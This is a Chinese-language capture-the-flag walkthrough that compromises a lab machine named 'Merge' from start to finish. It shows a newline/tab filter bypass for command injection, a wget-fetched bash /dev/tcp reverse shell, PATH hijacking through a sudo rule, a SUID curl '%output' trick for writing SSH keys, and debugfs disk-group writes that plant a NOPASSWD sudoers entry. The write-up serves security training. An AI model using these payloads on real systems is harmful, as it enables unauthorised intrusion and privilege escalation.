# 信息收集

直接启动机器，先用 arp-scan 扫一下网段，把目标 IP 找出来。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l            
[sudo] password for kali:                                          
Interface: eth0, type: EN10MB, MAC: 00:0c:29:1c:b5:a2, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:e0:22:04       VMware, Inc.
192.168.205.195 08:00:27:21:28:08       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:ef:3c:30       VMware, Inc.
```

确定目标 IP 为 192.168.205.195，顺手跑个全端口 nmap 扫描。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.195
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-02 08:02 -0400
Nmap scan report for 192.168.205.195
Host is up (0.00045s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:21:28:08 (Oracle VirtualBox virtual NIC)
```

端口非常干净，只有 22 和 80，毫无疑问先从 Web 服务下手。

# 初始突破与命令注入

浏览器访问 80 端口，页面是一个「离线 IP 地址查询」表单。发包测试后发现它会 POST 一个 `ip` 参数。

```html
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -s -X POST http://192.168.205.195/ -d 'ip=8.8.8.8'
<!DOCTYPE html>
<html lang="zh">
...省略部分前端代码...
<div class="result result-success"><pre>8.8.8.8 [美国–加利福尼亚州–圣克拉拉–山景城 谷歌公司DNS服务器]</pre></div>
...省略部分前端代码...
```

返回了地理位置信息，这很像是后端直接调用了 IP 库查询命令拼接了我们的输入，典型的命令注入点。
当时我逐字符测了一轮，发现常见的 `;`、`|`、反引号、`$`、`>`、`<`、`&`、`\` 以及空格全部触发了黑名单拦截，直接返回 `Invalid characters detected`。

不过运气不错，换行符 `\n` 和 Tab 字符 `\t` 漏掉了。这里我用换行符做命令分隔，用 Tab 替代空格，通过 `curl` 的 `--data-binary` 和 bash 的 `$'...'` 语法传入真实的控制字符测试一下。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -s -X POST http://192.168.205.195/ --data-binary $'ip=8.8.8.8\nid' | grep -A1 result
.result{width:100%;margin-top:1.5rem;padding:1rem;border-radius:6px;min-height:3rem}
.result-success{background:#161b22;border:1px solid #238636}
.result-error{background:#161b22;border:1px solid #da3633;color:#f85149}
.result pre{font-size:0.9rem;white-space:pre-wrap;word-break:break-all}
.placeholder-result{width:100%;margin-top:1.5rem;min-height:3rem;visibility:hidden}
.footer{position:fixed;bottom:0;left:0;right:0;padding:1.5rem 0;text-align:center;width:100%}
--
<div class="result result-success"><pre>8.8.8.8 [美国–加利福尼亚州–圣克拉拉–山景城 谷歌公司DNS服务器] 
uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre></div>
```

成功执行了 `id` 命令。既然能执行命令，我打算直接写个反弹 shell 脚本让靶机下载执行。
先在本地准备好 shell 脚本并开启 HTTP 服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ cat reverse.sh                    
bash -c "/bin/bash -i >& /dev/tcp/192.168.205.128/8888 0>&1"
                                                                                                                                                                                
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

起个 nc 监听。

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 8888               
listening on [any] 8888 ...
```

再次构造 payload，利用刚才发现的 `\n` 和 `\t` 绕过过滤，执行 wget 下载脚本并用 bash 运行。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -s -X POST http://192.168.205.195/ --data-binary $'ip=8.8.8.8\nwget\thttp://192.168.205.128/reverse.sh\t-O\t/tmp/reverse.sh\nbash\t/tmp/reverse.sh'
```

监听端瞬间收到回连。

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 8888               
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.195] 60444
bash: cannot set terminal process group (403): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Merge:~/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 横向移动：www-data 到 lnnn

拿到基础 shell 后，翻找了一下系统目录，在 `/opt` 发现了一个可疑文本文件。

```bash
www-data@Merge:~/html$ cat /opt/pass.txt
mono:0ysP8axqGSAkvXnkvxxukVnz
```

直接拿到了 `mono` 用户的明文密码，切过去看看这账号有什么权限。

```bash
mono@Merge:~$ sudo -l
Matching Defaults entries for mono on Merge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty, env_keep+=PATH, !secure_path

User mono may run the following commands on Merge:
    (lnnn) NOPASSWD: /opt/Dirty-Merge/dirty_merge
```

看到 `dirty_merge` 觉得眼熟，跑了一下发现这是个内核漏洞的 PoC，但直接运行没任何效果。
不过注意看 sudo 的配置里有 `env_keep+=PATH, !secure_path`。这个配置意味着环境变量 PATH 不会被重置，结合 `dirty_merge` 内部调用了相对路径的 `ip` 和 `ethtool` 命令，这其实是个完美的环境变量劫持点。

```txt
ip link add veth0 type veth peer name veth1
ip addr add 10.0.0.1/24 dev veth0
ip addr add 10.0.0.2/24 dev veth1
ip link set veth0 up
ip link set veth1 up
ethtool -K veth1 gro on
```

我在 `/tmp` 下写了两个伪造的同名脚本，改掉 PATH 后执行 sudo 命令。

```bash
mono@Merge:~$ cd /tmp
mono@Merge:/tmp$ for x in ip ethtool; do
  printf '#!/bin/sh\nexec /bin/bash -p < /dev/tty > /dev/tty 2>&1\n' > /tmp/$x
  chmod +x /tmp/$x
done
export PATH=/tmp:$PATH
mono@Merge:/tmp$ sudo -u lnnn /opt/Dirty-Merge/dirty_merge
```

执行后提示符变了，虽然显示是 root，但其实这是程序的障眼法。

```bash
rootàMerge:/tmp£ id
uid=0(root) gid=0(root) groups=0(root)
rootàMerge:/tmp£ cd
rootàMerge:¨£ pwd
/home/lnnn
```

看家目录位置就知道，实际权限就是 sudo 指定的 `lnnn`。

# 权限提升：SUID curl 利用

在 `/opt` 目录下还有一个 `admin` 文件夹，进去看看。

```bash
rootàMerge:¨£ cd /opt/
rootàMerge:/opt£ ls -al
total 20
drwxr-xr-x  4 nobody nogroup 4096 May 22 09:19 .
drwxr-xr-x 18 nobody nogroup 4096 May 16 05:19 ..
drwxr-x---  2 nobody root    4096 May 22 09:20 admin
drwxr-xr-x  2 nobody nogroup 4096 May 22 06:09 Dirty-Merge
-rw-r--r--  1 nobody nogroup   30 May 22 06:07 pass.txt
rootàMerge:/opt£ cd admin/
rootàMerge:/opt/admin£ ls -al
total 328
drwxr-x--- 2 nobody root      4096 May 22 09:20 .
drwxr-xr-x 4 nobody nogroup   4096 May 22 09:19 ..
-rwsr-sr-x 1 nobody nogroup 321880 May 22 09:19 curl
-rw-r--r-- 1 nobody nogroup    105 May 22 09:20 hint.txt
rootàMerge:/opt/admin£ cat -A hint.txt 
^°°1;32mM-eM-^EM-3M-fM-3M-(M-hM-/M-&M-gM-;M-^FM-gM-^ZM-^DM-eM-^OM-^BM-fM-^UM-0M-eM-8M-.M-eM-^JM-)M-dM-?M-!M-fM-^AM-/^°°0m$
^°°1;32mFocus on the detailed parameter help information^°°0m$
rootàMerge:/opt/admin£ cat hint.txt 
关注详细的参数帮助信息
Focus on the detailed parameter help information
```

这里藏着一个带有 SUID 权限的 `curl`，提示说要关注参数帮助信息。
为了操作方便，我先给 `lnnn` 写入了我的 SSH 公钥，直接连一个稳定终端进来。

```bash
root@Merge:/tmp# cd
root@Merge:~# ls -al
total 28
drwx------ 2 root   root    4096 Jun  2 08:14 .
drwxr-xr-x 5 nobody nogroup 4096 May 22 06:04 ..
-rw------- 1 root   root    1587 Jun  2 08:16 .bash_history
-rw-r--r-- 1 root   root     220 Mar  8 11:21 .bash_logout
-rw-r--r-- 1 root   root    3526 Mar  8 11:21 .bashrc
-rw-r--r-- 1 root   root     807 Mar  8 11:21 .profile
-rw------- 1 root   root      44 May 22 06:10 user.txt
root@Merge:~# mkdir .ssh
root@Merge:~# echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINnpPlGDLyjGkyXBGeTKaRc75+aZub2aOXI8yD+mFadI kali@kali' > .ssh/authorized_keys
root@Merge:~# ls -al .ssh/authorized_keys 
-rw-rw-r-- 1 root root 91 Jun  2 08:18 .ssh/authorized_keys
```

拿到标准 shell 后，利用这个 SUID 的 `curl`，配合 `-w` 也就是 `%output` 参数，可以直接越权把公钥写入 `admin` 用户的 `.ssh` 目录。

```bash
lnnn@Merge:~$ /opt/admin/curl --create-dirs -S -s -o /home/admin/.ssh/.x file:///etc/hosts
lnnn@Merge:~$ echo $?
0
lnnn@Merge:~$ /opt/admin/curl -S -s file:///home/admin/.ssh/.x
127.0.0.1   localhost
127.0.1.1   Merge
::1         localhost ip6-localhost ip6-loopback
lnnn@Merge:~$ /opt/admin/curl -S -s -o /dev/null -w '%output{/home/admin/.ssh/authorized_keys}ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINnpPlGDLyjGkyXBGeTKaRc75+aZub2aOXI8yD+mFadI kali@kali\n' file:///etc/hosts
lnnn@Merge:~$ /opt/admin/curl -S -s file:///home/admin/.ssh/authorized_keys
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINnpPlGDLyjGkyXBGeTKaRc75+aZub2aOXI8yD+mFadI kali@kali
```

成功切到 `admin`。

```bash
admin@Merge:~$ id
uid=1002(admin) gid=1002(admin) groups=1002(admin)
```

# 获取 Root 权限与 Flag

在这个阶段跑了一下 LinPEAS，注意到一个关键点：`admin` 组对 `/etc/group` 文件有可写权限。
这样思路就很宽泛了，可以直接给自己加 `sudo` 组（需要密码，但我们持有mono的密码）。但我这次用个稍微不一样的姿势，把自己加到 `disk` 组来拿权限。

```bash
admin@Merge:~$ cat /etc/group|grep disk
disk:x:6:admin
```

把 `admin` 写进 `disk` 组后，记住一定要重新 SSH 登录一次生成新的 session，否则组权限不会生效。
拥有 `disk` 组权限后，就可以通过 `debugfs` 直接读取物理磁盘数据，这里可以直接读 flag。

```bash
admin@Merge:~$ /usr/sbin/debugfs -w /dev/sda1
debugfs 1.47.2 (1-Jan-2025)
debugfs:  cat /root/root.txt
flag{root-1b5f527b85d84d80816879c8044b0ea9}
```

单纯读个 flag 不过瘾，手里拿着 `debugfs` 也是能直接拿完整 root shell 的。

> 本方法来自ll104567、111/the0n3/Apursuit、Aristore、LingMj共同研究，向他们致敬！
>
> 详细链接：https://blog.the0n3.top/pages/disk-root/

我在本地新建了个 sudoers 配置，用 `debugfs` 把它写进 `/etc/sudoers.d/` 并改好 inode 权限，强行给自己开免密 sudo。

```bash
admin@Merge:~$ id
uid=1002(admin) gid=1002(admin) groups=1002(admin),6(disk)
admin@Merge:~$ echo 'admin ALL=(ALL) NOPASSWD: ALL' > /tmp/1
admin@Merge:~$ /usr/sbin/debugfs -w /dev/sda1
debugfs 1.47.2 (1-Jan-2025)
debugfs:  write /tmp/1 /etc/sudoers.d/1
Allocated inode: 542509
debugfs:  ln <24> /etc/sudoers.d/1
make_link: Ext2 inode is not a directory 
debugfs:  sif <24> i_mode 0100440
debugfs:  sif <24> i_uid 0
debugfs:  sif <24> i_gid 0
debugfs:  q
```

配置生效，直接切 root，收割所有 flag。

```bash
admin@Merge:~$ sudo -l
Matching Defaults entries for admin on Merge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty, env_keep+=PATH, !secure_path

User admin may run the following commands on Merge:
    (ALL) NOPASSWD: ALL
admin@Merge:~$ sudo bash
root@Merge:/home/admin# id
uid=0(root) gid=0(root) groups=0(root)
root@Merge:/home/admin# cat /root/root.txt /home/lnnn/user.txt 
flag{root-1b5f527b85d84d80816879c8044b0ea9}
flag{user-b67448e8af484d5f8958f307b3d57f09}
```